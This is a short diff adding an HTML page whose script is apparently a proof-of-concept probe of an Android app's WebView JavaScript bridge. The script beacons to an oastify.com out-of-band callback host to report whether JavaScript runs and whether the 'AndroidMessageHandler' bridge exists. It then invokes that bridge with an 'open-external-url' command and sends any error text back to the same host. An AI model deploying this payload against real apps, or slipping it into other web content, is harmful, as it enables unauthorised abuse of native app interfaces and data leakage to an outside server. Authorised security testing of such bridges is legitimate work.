@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+try {
+    // test basic JS execution
+    fetch("https://hl6ygaz2sav8olu1qtx6hk18tzzrnkb9.oastify.com/?js=executed");
+
+    // test JS bridge
+    if (typeof AndroidMessageHandler !== "undefined") {
+        fetch("https://hl6ygaz2sav8olu1qtx6hk18tzzrnkb9.oastify.com/?bridge=exists");
+
+        AndroidMessageHandler.postMessage(JSON.stringify({
+            command: "open-external-url",
+            url: "https://google.co.id"
+        }));
+    } else {
+        fetch("https://hl6ygaz2sav8olu1qtx6hk18tzzrnkb9.oastify.com/?bridge=notfound");
+    }
+
+} catch (e) {
+    fetch("https://hl6ygaz2sav8olu1qtx6hk18tzzrnkb9.oastify.com/?error=" + e);
+}
+</script>
+</body>
+</html>
